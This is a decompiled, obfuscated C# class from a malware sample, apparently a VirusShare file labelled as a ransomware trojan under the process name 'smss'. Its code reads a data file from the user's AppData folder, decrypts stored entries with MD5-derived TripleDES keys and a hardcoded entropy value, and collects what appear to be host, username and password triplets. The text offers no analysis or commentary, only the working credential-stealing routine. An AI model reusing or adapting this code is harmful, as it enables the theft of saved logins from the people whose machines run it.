// Decompiled with JetBrains decompiler
// Type: .
// Assembly: smss, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: E062C21C-108A-4088-B8AD-F222EA4C3418
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-29f84241ce2d6a79cfefca98655fcd4fd54dd724bded5f239ceefec315a648b5.exe

using \u0004;
using \u0006;
using \u0008;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace \u0008
{
  internal class \u0002
  {
    public static string \u0001;

    public class \u0001
    {
      public static byte[] \u0001;
      public static byte[] \u0002;
      public static string \u0003;
      public static string \u0004;
      public static int \u0005;
      public static int \u0006;
      public static int \u0007;
      public static bool \u0008;
      public static string \u000E;
      public static string \u000F;
      public static string \u0010;
      public static string[] \u0011;
      public static string[] \u0012;
      public static string[] \u0013;
      public static int \u0014;
      public static bool \u0015;
      public static string[] \u0016;
      public static string[] \u0017;
      [NonSerialized]
      internal static \u0005 \u008D;

      static \u0001()
      {
        Type type = typeof (\u0002.\u0001);
        if (true)
          goto label_2;
label_1:
        \u0002.\u0001.\u0001 = new byte[11]
        {
          (byte) 131,
          (byte) 125,
          (byte) 252,
          (byte) 15,
          (byte) 142,
          (byte) 179,
          (byte) 232,
          (byte) 105,
          (byte) 115,
          (byte) 175,
          byte.MaxValue
        };
        \u0002.\u0001.\u0002 = new byte[4]
        {
          (byte) 0,
          (byte) 0,
          (byte) 0,
          (byte) 8
        };
        \u0002.\u0001.\u0003 = \u0010.\u0080(Environment.SpecialFolder.ApplicationData);
        \u0002.\u0001.\u0005 = 0;
        \u0002.\u0001.\u0006 = 0;
        \u0002.\u0001.\u0007 = 0;
        \u0002.\u0001.\u0008 = true;
        \u0002.\u0001.\u0011 = new string[1001];
        \u0002.\u0001.\u0012 = new string[1001];
        \u0002.\u0001.\u0013 = new string[1001];
        \u0002.\u0001.\u0014 = 0;
        \u0002.\u0001.\u0015 = false;
        \u0002.\u0001.\u0017 = new string[3001];
        return;
label_2:
        \u0002.\u0001(type);
        goto label_1;
      }

      public object \u0001()
      {
        List<string> stringList = new List<string>();
        string[] strArray1 = (string[]) \u0002.\u0001.\u0001();
        try
        {
          string[] strArray2 = strArray1;
          int index = 0;
          while (index < strArray2.Length)
          {
            string str = strArray2[index];
            if (\u0007.\u001A(str, \u0002.\u0001.\u008D(407), false) != 0)
              stringList.Add(str);
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u000F.\u001D();
        }
        StringBuilder stringBuilder1 = new StringBuilder();
        try
        {
          if (stringList.Count == 0)
          {
            string[] strArray3 = new string[5]
            {
              \u0001.\u0001(\u0002.\u0001.\u008D(10522), \u0002.\u0001.\u008D(465)),
              \u008B.\u001A\u0002(),
              \u0001.\u0001(\u0002.\u0001.\u008D(10583), \u0002.\u0001.\u008D(465)),
              \u008B.\u001A\u0002(),
              \u0001.\u0001(\u0002.\u0001.\u008D(10729), \u0002.\u0001.\u008D(465))
            };
            string str = \u008D.\u001C\u0002(strArray3);
          }
          else
          {
            int num = checked (stringList.Count - 1);
            int index = 0;
            while (index <= num)
            {
              StringBuilder stringBuilder2 = \u0013\u0003.\u007E\u0019\u0004((object) \u0012\u0003.\u007E\u0018\u0004((object) stringBuilder1, \u0011.\u0081(\u0001.\u0001(\u0002.\u0001.\u008D(10790), \u0002.\u0001.\u008D(465)), \u0083\u0002.\u007E\u001F\u0003((object) stringList[index], 1))));
              StringBuilder stringBuilder3 = \u0013\u0003.\u007E\u0019\u0004((object) \u0012\u0003.\u007E\u0018\u0004((object) stringBuilder1, \u0011.\u0081(\u0001.\u0001(\u0002.\u0001.\u008D(10807), \u0002.\u0001.\u008D(465)), \u0083\u0002.\u007E\u001F\u0003((object) stringList[checked (index + 1)], 1))));
              StringBuilder stringBuilder4 = \u0013\u0003.\u007E\u0019\u0004((object) \u0012\u0003.\u007E\u0018\u0004((object) stringBuilder1, \u0011.\u0081(\u0001.\u0001(\u0002.\u0001.\u008D(10832), \u0002.\u0001.\u008D(465)), \u0083\u0002.\u007E\u001F\u0003((object) stringList[checked (index + 2)], 1))));
              StringBuilder stringBuilder5 = \u0013\u0003.\u007E\u0019\u0004((object) \u0012\u0003.\u007E\u0018\u0004((object) stringBuilder1, \u0001.\u0001(\u0002.\u0001.\u008D(10857), \u0002.\u0001.\u008D(465))));
              checked { index += 3; }
            }
            string[] strArray4 = new string[5]
            {
              \u0001.\u0001(\u0002.\u0001.\u008D(10522), \u0002.\u0001.\u008D(465)),
              \u008B.\u001A\u0002(),
              global::\u0004.\u007E\u0013((object) stringBuilder1),
              \u008B.\u001A\u0002(),
              \u0001.\u0001(\u0002.\u0001.\u008D(10729), \u0002.\u0001.\u008D(465))
            };
            \u0002.\u0001 = \u008D.\u001C\u0002(strArray4);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u000F.\u001D();
        }
        object obj;
        return obj;
      }

      public static object \u0001()
      {
        try
        {
          if (\u0012.\u0083(\u0011.\u0081(\u0002.\u0001.\u0003, \u0001.\u0001(\u0002.\u0001.\u008D(10918), \u0002.\u0001.\u008D(465)))))
          {
            \u0002.\u0001.\u0003 = \u0011.\u0081(\u0002.\u0001.\u0003, \u0001.\u0001(\u0002.\u0001.\u008D(10963), \u0002.\u0001.\u008D(465)));
            \u0002.\u0001.\u0001();
          }
          else if (\u0012.\u0083(\u0011.\u0081(\u0002.\u0001.\u0003, \u0001.\u0001(\u0002.\u0001.\u008D(11008), \u0002.\u0001.\u008D(465)))))
          {
            \u0002.\u0001.\u0003 = \u0011.\u0081(\u0002.\u0001.\u0003, \u0001.\u0001(\u0002.\u0001.\u008D(11065), \u0002.\u0001.\u008D(465)));
            \u0002.\u0001.\u0001();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u000F.\u001D();
        }
        return (object) \u0002.\u0001.\u0017;
      }

      public static void \u0001()
      {
        try
        {
          byte[] numArray1 = \u0099.\u0088\u0002(\u0002.\u0001.\u0003);
          int num1 = checked (numArray1.Length - 5);
          int index1 = 0;
          while (index1 <= num1)
          {
            if (numArray1[index1] == (byte) 0 && numArray1[checked (index1 + 1)] == (byte) 0 && numArray1[checked (index1 + 2)] == (byte) 0 && numArray1[checked (index1 + 3)] == (byte) 8)
            {
              int num2 = (int) numArray1[checked (index1 + 15)];
              byte[] numArray2 = new byte[8];
              byte[] numArray3 = new byte[checked (num2 - 1 + 1)];
              \u0014\u0003.\u001A\u0004((Array) numArray1, checked (index1 + 4), (Array) numArray2, 0, numArray2.Length);
              \u0014\u0003.\u001A\u0004((Array) numArray1, checked (index1 + 16), (Array) numArray3, 0, numArray3.Length);
              \u0002.\u0001.\u0004 = \u0011\u0002.\u0003\u0003(\u0004\u0003.\u0008\u0004((object) \u0002.\u0001.\u0004, \u0004\u0003.\u0007\u0004(\u0002.\u0001.\u0001(numArray2, numArray3), (object) \u008B.\u001A\u0002())));
              checked { index1 += 11 + num2; }
            }
            checked { ++index1; }
          }
          \u0002.\u0001.\u0016 = \u0084\u0002.\u007E\u0080\u0003((object) \u0002.\u0001.\u0004, new char[1]
          {
            \u008C\u0002.\u008A\u0003(\u008B.\u001A\u0002())
          });
          int index2 = 0;
          do
          {
            \u0002.\u0001.\u0016[index2] = (string) null;
            checked { ++index2; }
          }
          while (index2 <= 3);
          int num3 = checked (\u0002.\u0001.\u0016.Length - 1);
          int index3 = 0;
          while (index3 <= num3)
          {
            \u0002.\u0001.\u000E = (string) null;
            \u0002.\u0001.\u000F = (string) null;
            \u0002.\u0001.\u0010 = (string) null;
            \u0002.\u0001.\u0005 = 0;
            if (\u0094.\u007E\u0082\u0002((object) \u0002.\u0001.\u0016[index3], \u0001.\u0001(\u0002.\u0001.\u008D(11122), \u0002.\u0001.\u008D(465))) || \u0094.\u007E\u0082\u0002((object) \u0002.\u0001.\u0016[index3], \u0001.\u0001(\u0002.\u0001.\u008D(11139), \u0002.\u0001.\u008D(465))) || \u0094.\u007E\u0082\u0002((object) \u0002.\u0001.\u0016[index3], \u0001.\u0001(\u0002.\u0001.\u008D(11156), \u0002.\u0001.\u008D(465))))
            {
              if (index3 != 0)
              {
                int num4 = checked (\u0003.\u007E\u0004((object) \u0002.\u0001.\u0016[index3]) - 1);
                int num5 = 0;
                while (num5 <= num4)
                {
                  if (\u0015\u0003.\u007E\u001B\u0004((object) \u0002.\u0001.\u0016[index3], checked (num5 - \u0002.\u0001.\u0005)) > '\u007F')
                  {
                    \u0002.\u0001.\u0016[index3] = \u0017\u0002.\u007E\u000F\u0003((object) \u0002.\u0001.\u0016[index3], checked (num5 - \u0002.\u0001.\u0005), 1);
                    checked { ++\u0002.\u0001.\u0005; }
                  }
                  checked { ++num5; }
                }
                if (checked (index3 - \u0002.\u0001.\u0014) == 1)
                  \u0002.\u0001.\u000E = \u0002.\u0001.\u0016[index3];
                else if (checked (index3 - \u0002.\u0001.\u0014) == 2)
                  \u0002.\u0001.\u000E = \u0002.\u0001.\u0016[index3];
                if (\u0094.\u007E\u0082\u0002((object) \u0002.\u0001.\u0016[index3], \u0001.\u0001(\u0002.\u0001.\u008D(11156), \u0002.\u0001.\u008D(465))))
                  \u0002.\u0001.\u000E = \u0002.\u0001.\u0016[index3];
                \u0002.\u0001.\u0014 = index3;
              }
            }
            else if (\u0002.\u0001.\u0015)
            {
              if (checked (index3 - \u0002.\u0001.\u0014) == 1 || checked (index3 - \u0002.\u0001.\u0014) == 2)
              {
                int num6 = checked (\u0003.\u007E\u0004((object) \u0002.\u0001.\u0016[index3]) - 1);
                int num7 = 0;
                while (num7 <= num6)
                {
                  if (\u0015\u0003.\u007E\u001B\u0004((object) \u0002.\u0001.\u0016[index3], checked (num7 - \u0002.\u0001.\u0005)) > '\u007F')
                  {
                    \u0002.\u0001.\u0016[index3] = \u0017\u0002.\u007E\u000F\u0003((object) \u0002.\u0001.\u0016[index3], checked (num7 - \u0002.\u0001.\u0005), 1);
                    checked { ++\u0002.\u0001.\u0005; }
                  }
                  checked { ++num7; }
                }
                if (checked (index3 - \u0002.\u0001.\u0014) == 1)
                  \u0002.\u0001.\u000F = \u0002.\u0001.\u0016[index3];
                else if (checked (index3 - \u0002.\u0001.\u0014) == 2)
                {
                  \u0002.\u0001.\u0010 = \u0002.\u0001.\u0016[index3];
                  checked { ++\u0002.\u0001.\u0006; }
                  \u0002.\u0001.\u0015 = false;
                }
              }
            }
            else if (\u0002.\u0001.\u0014 != 0 && (index3 == checked (\u0002.\u0001.\u0014 + 2) || index3 == checked (\u0002.\u0001.\u0014 + 4)))
            {
              int num8 = checked (\u0003.\u007E\u0004((object) \u0002.\u0001.\u0016[index3]) - 1);
              int num9 = 0;
              while (num9 <= num8)
              {
                if (\u0015\u0003.\u007E\u001B\u0004((object) \u0002.\u0001.\u0016[index3], checked (num9 - \u0002.\u0001.\u0005)) > '\u007F')
                {
                  \u0002.\u0001.\u0016[index3] = \u0017\u0002.\u007E\u000F\u0003((object) \u0002.\u0001.\u0016[index3], checked (num9 - \u0002.\u0001.\u0005), 1);
                  checked { ++\u0002.\u0001.\u0005; }
                }
                checked { ++num9; }
              }
              if (index3 == checked (\u0002.\u0001.\u0014 + 2))
                \u0002.\u0001.\u000F = \u0002.\u0001.\u0016[index3];
              else if (index3 == checked (\u0002.\u0001.\u0014 + 4))
              {
                \u0002.\u0001.\u0010 = \u0002.\u0001.\u0016[index3];
                checked { ++\u0002.\u0001.\u0006; }
              }
            }
            if (\u0007.\u001A(\u0002.\u0001.\u000E, (string) null, false) != 0)
              \u0002.\u0001.\u0011[\u0002.\u0001.\u0006] = \u0002.\u0001.\u000E;
            if (\u0007.\u001A(\u0002.\u0001.\u000F, (string) null, false) != 0)
              \u0002.\u0001.\u0012[\u0002.\u0001.\u0006] = \u0002.\u0001.\u000F;
            if (\u0007.\u001A(\u0002.\u0001.\u0010, (string) null, false) != 0)
              \u0002.\u0001.\u0013[checked (\u0002.\u0001.\u0006 - 1)] = \u0002.\u0001.\u0010;
            checked { ++index3; }
          }
          int num10 = checked (\u0002.\u0001.\u0011.Length - 1);
          int index4 = 0;
          while (index4 <= num10 && \u0007.\u001A(\u0002.\u0001.\u0011[index4], \u0002.\u0001.\u008D(407), false) != 0)
          {
            \u0002.\u0001.\u0017[\u0002.\u0001.\u0007] = \u0002.\u0001.\u0011[index4];
            \u0002.\u0001.\u0017[checked (\u0002.\u0001.\u0007 + 1)] = \u0002.\u0001.\u0012[index4];
            \u0002.\u0001.\u0017[checked (\u0002.\u0001.\u0007 + 2)] = \u0002.\u0001.\u0013[index4];
            checked { \u0002.\u0001.\u0007 += 3; }
            checked { ++index4; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u000F.\u001D();
        }
      }

      public static object \u0001([In] byte[] obj0, [In] byte[] obj1)
      {
        object obj;
        try
        {
          MD5CryptoServiceProvider cryptoServiceProvider1 = new MD5CryptoServiceProvider();
          \u0018.\u007E\u0093((object) cryptoServiceProvider1);
          byte[] numArray1 = new byte[checked (\u0002.\u0001.\u0001.Length + (obj0.Length - 1) + 1)];
          \u0016\u0003.\u001C\u0004((Array) \u0002.\u0001.\u0001, (Array) numArray1, \u0002.\u0001.\u0001.Length);
          \u0014\u0003.\u001A\u0004((Array) obj0, 0, (Array) numArray1, \u0002.\u0001.\u0001.Length, obj0.Length);
          byte[] numArray2 = \u0017\u0003.\u007E\u001D\u0004((object) cryptoServiceProvider1, numArray1);
          byte[] numArray3 = new byte[checked (numArray2.Length + \u0002.\u0001.\u0001.Length + (obj0.Length - 1) + 1)];
          \u0016\u0003.\u001C\u0004((Array) numArray2, (Array) numArray3, numArray2.Length);
          \u0014\u0003.\u001A\u0004((Array) \u0002.\u0001.\u0001, 0, (Array) numArray3, numArray2.Length, \u0002.\u0001.\u0001.Length);
          \u0014\u0003.\u001A\u0004((Array) obj0, 0, (Array) numArray3, checked (numArray2.Length + \u0002.\u0001.\u0001.Length), obj0.Length);
          byte[] numArray4 = \u0017\u0003.\u007E\u001D\u0004((object) cryptoServiceProvider1, numArray3);
          TripleDESCryptoServiceProvider cryptoServiceProvider2 = new TripleDESCryptoServiceProvider();
          \u0018\u0003.\u007E\u001E\u0004((object) cryptoServiceProvider2, CipherMode.CBC);
          \u0019\u0003.\u007E\u001F\u0004((object) cryptoServiceProvider2, PaddingMode.None);
          byte[] numArray5 = new byte[24];
          byte[] numArray6 = new byte[8];
          \u0016\u0003.\u001C\u0004((Array) numArray2, (Array) numArray5, numArray2.Length);
          \u0014\u0003.\u001A\u0004((Array) numArray4, 0, (Array) numArray5, numArray2.Length, 8);
          \u0014\u0003.\u001A\u0004((Array) numArray4, 8, (Array) numArray6, 0, 8);
          obj0 = numArray5;
          \u001A\u0003.\u007E\u007F\u0004((object) cryptoServiceProvider2, numArray6);
          ICryptoTransform cryptoTransform = \u001B\u0003.\u007E\u0080\u0004((object) cryptoServiceProvider2);
          byte[] numArray7 = \u001C\u0003.\u007E\u0081\u0004((object) cryptoTransform, obj1, 0, obj1.Length);
          obj = (object) \u0006\u0002.\u007E\u009C\u0002((object) \u0004\u0002.\u0099\u0002(), numArray7);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          obj = (object) \u0002.\u0001.\u008D(407);
          \u000F.\u001D();
        }
        return obj;
      }
    }
  }
}
